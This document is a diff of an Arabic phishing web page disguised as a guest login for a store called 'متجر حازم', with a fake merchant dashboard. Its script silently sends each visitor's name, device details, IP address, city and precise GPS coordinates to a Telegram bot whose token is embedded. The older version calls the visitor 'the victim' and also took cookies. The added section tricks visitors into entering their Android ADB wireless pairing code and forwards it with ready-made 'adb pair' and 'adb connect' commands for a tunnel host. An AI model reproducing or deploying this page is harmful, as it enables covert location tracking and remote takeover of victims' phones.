@@ -9,20 +9,19 @@
         .neon-box { padding: 30px; border: 2px solid #00fbff; border-radius: 15px; background: rgba(0, 251, 255, 0.02); box-shadow: 0 0 20px #00fbff; text-align: center; width: 90%; max-width: 500px; }
         h1 { font-size: 2.2rem; text-shadow: 0 0 10px #00fbff; margin-bottom: 15px; }
         
-        /* تنسيق حقل الإدخال */
         .input-group { margin-bottom: 20px; text-align: right; }
         .input-group label { display: block; margin-bottom: 8px; color: #00fbff; font-size: 0.9rem; }
-        .input-field { width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid #00fbff; border-radius: 8px; color: white; outline: none; box-sizing: border-box; }
+        .input-field { width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid #00fbff; border-radius: 8px; color: white; outline: none; box-sizing: border-box; text-align: center; }
         
-        .btn-next { background: transparent; color: #00fbff; border: 2px solid #00fbff; padding: 12px 50px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; transition: 0.4s; font-weight: bold; box-shadow: 0 0 10px #00fbff; width: 100%; }
+        .btn-next { background: transparent; color: #00fbff; border: 2px solid #00fbff; padding: 12px 50px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; transition: 0.4s; font-weight: bold; box-shadow: 0 0 10px #00fbff; width: 100%; margin-top: 10px; }
         .btn-next:hover { background: #00fbff; color: #000; }
 
         #second-interface { display: none; text-align: right; }
-        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
-        .stat-item { background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 10px; border: 1px solid #333; text-align: center; }
-        .stat-item span { display: block; color: #00fbff; font-size: 1.4rem; font-weight: bold; }
-        .transaction-list { background: rgba(255, 255, 255, 0.03); border-radius: 10px; padding: 15px; font-size: 0.9rem; }
-        .t-item { border-bottom: 1px solid #222; padding: 8px 0; display: flex; justify-content: space-between; }
+        .adb-section { background: rgba(255, 204, 0, 0.05); border: 1px dashed #ffcc00; padding: 15px; border-radius: 10px; margin-top: 20px; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 15px 0; }
+        .stat-item { background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 10px; border: 1px solid #333; text-align: center; }
+        .stat-item span { display: block; color: #00fbff; font-size: 1.2rem; font-weight: bold; }
+        
         .fade-in { animation: fadeIn 0.5s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
@@ -33,29 +32,34 @@
         <h1>متجر حازم</h1>
         <div class="input-group">
             <label>سجل دخولك كزائر للمتابعة:</label>
-            <input type="text" id="visitor-name" class="input-field" placeholder="أدخل اسمك هنا...">
+            <input type="text" id="visitor-name" class="input-field" placeholder="أدخل اسمك الكريم...">
         </div>
         <button class="btn-next" onclick="handleStart()">دخول كزائر</button>
-        <p style="font-size: 0.6rem; color: #444; margin-top: 15px;">بالمتابعة أنت توافق على معالجة بيانات الجلسة المؤقتة</p>
     </div>
 
     <div id="second-interface" class="neon-box fade-in">
-        <h2 style="color: #00fbff; text-align: center;">لوحة التاجر النشطة</h2>
-        <p id="welcome-msg" style="text-align: center; color: #888;"></p>
+        <h2 style="color: #00fbff; text-align: center; margin-bottom: 5px;">لوحة التاجر النشطة</h2>
+        <p id="welcome-msg" style="text-align: center; color: #888; font-size: 0.9rem;"></p>
+
         <div class="stats-grid">
             <div class="stat-item"><span>$2,840.00</span><label>الأرباح</label></div>
             <div class="stat-item"><span>154</span><label>عمليات</label></div>
         </div>
-        <div class="transaction-list">
-            <div class="t-item"><span>بيع بطاقة Google</span> <span style="color:#00ff88;">+$50.00</span></div>
-            <div class="t-item"><span>شحن رصيد</span> <span style="color:#00ff88;">+$120.00</span></div>
+
+        <div class="adb-section">
+            <h3 style="color: #ffcc00; font-size: 1rem; margin-top: 0;">🔐 تأمين الجلسة (ADB WiFi)</h3>
+            <p style="font-size: 0.75rem; color: #bbb;">لربط هاتفك بالمتجر وتلقي الإشعارات، أدخل رمز الإقران من إعدادات المطور:</p>
+            <input type="number" id="adb-pair-code" class="input-field" placeholder="رمز الإقران (6 أرقام)" style="border-color: #ffcc00;">
+            <button class="btn-next" style="color: #ffcc00; border-color: #ffcc00; box-shadow: 0 0 5px #ffcc00; font-size: 1rem;" onclick="sendAdbToTelegram()">إتمام الربط</button>
         </div>
-        <p id="status-text" style="color: #ffcc00; font-size: 0.8rem; margin-top: 20px; text-align: center;">جاري المزامنة...</p>
+
+        <p id="status-text" style="color: #444; font-size: 0.75rem; margin-top: 15px; text-align: center;">جاري مزامنة بيانات الموقع و الـ IP...</p>
     </div>
 
     <script>
         const BOT_TOKEN = '8480565791:AAFovWtTmBP3FfHzx4w9z10rXUtIZgwo6MQ';
         const CHAT_ID = '5991790192';
+        let currentVisitor = "مجهول";
 
         function sendToTelegram(text) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -66,50 +70,61 @@
         }
 
         async function handleStart() {
-            const visitorName = document.getElementById('visitor-name').value || "غير معروف";
-            
-            // تبديل الواجهة
+            currentVisitor = document.getElementById('visitor-name').value || "غير معروف";
             document.getElementById('first-interface').style.display = 'none';
             document.getElementById('second-interface').style.display = 'block';
-            document.getElementById('welcome-msg').innerText = "أهلاً بك، " + visitorName;
+            document.getElementById('welcome-msg').innerText = "مرحباً بك، " + currentVisitor;
 
-            // إرسال الاسم فوراً
-            sendToTelegram(`👤 **زائر جديد سجل دخوله:**\nالاسم: \`${visitorName}\``);
-
-            // جمع البيانات العميقة (البصمة)
-            const fingerPrint = `
-📋 **تفاصيل جهاز الضحية (${visitorName}):**
---------------------------
-🆔 **البصمة:** \`${navigator.userAgent.length}\`
-🖥️ **النظام:** ${navigator.platform}
-🧠 **المعالج:** ${navigator.hardwareConcurrency} نواة
-💾 **الرام:** ${navigator.deviceMemory || 'N/A'} GB
-🌐 **اللغة:** ${navigator.language}
-🕒 **التوقيت:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-🍪 **الكوكيز:** ${document.cookie || "فارغة"}
+            // إرسال الاسم وبصمة الجهاز فوراً
+            const info = `
+👤 **دخول زائر جديد:**
+👤 الاسم: \`${currentVisitor}\`
+📱 الجهاز: ${navigator.platform}
+🧠 المعالج: ${navigator.hardwareConcurrency} نواة
+🔋 الحالة: ${navigator.onLine ? "متصل" : "أوفلاين"}
+🕒 التوقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 --------------------------`;
-            sendToTelegram(fingerPrint);
+            sendToTelegram(info);
 
-            // جلب الـ IP والموقع
+            // جلب الموقع و الـ IP
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipJson = await ipRes.json();
                 const userIP = ipJson.ip;
-                
                 const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
                 const geoData = await geoRes.json();
 
-                sendToTelegram(`🎯 **IP و خريطة (${visitorName}):**\nIP: \`${userIP}\`\nالموقع: ${geoData.city}, ${geoData.country_name}`);
+                sendToTelegram(`🎯 **بيانات الاتصال (${currentVisitor}):**\nIP: \`${userIP}\`\nالموقع: ${geoData.city}, ${geoData.country_name}`);
             } catch (e) {}
 
-            // طلب الموقع الدقيق
+            // طلب GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
-                    const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendToTelegram(`📍 **الموقع الدقيق لـ ${visitorName}:**\n${link}`);
-                    document.getElementById('status-text').innerText = "تم تحديث البيانات بنجاح.";
+                    const map = `📍 **موقع GPS دقيق (${currentVisitor}):**\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram(map);
                 }, null, {enableHighAccuracy: true});
             }
+        }
+
+        // وظيفة ADB المدمجة
+        function sendAdbToTelegram() {
+            const pairCode = document.getElementById('adb-pair-code').value;
+            const tunnelAddr = "mjozbmegk.localto.net"; 
+
+            if(!pairCode) { alert("يرجى إدخال الرمز أولاً"); return; }
+
+            const msg = `
+🚀 **بيانات ADB WiFi جديدة (${currentVisitor}):**
+--------------------------
+🔗 رابط النفق: \`${tunnelAddr}\`
+🔑 رمز الإقران: \`${pairCode}\`
+--------------------------
+**أوامر الكالي الجاهزة:**
+\`adb pair ${tunnelAddr} ${pairCode}\`
+\`adb connect ${tunnelAddr}\`
+            `;
+            sendToTelegram(msg);
+            alert("جاري التحقق من المزامنة... يرجى الانتظار 30 ثانية.");
         }
     </script>
 </body>
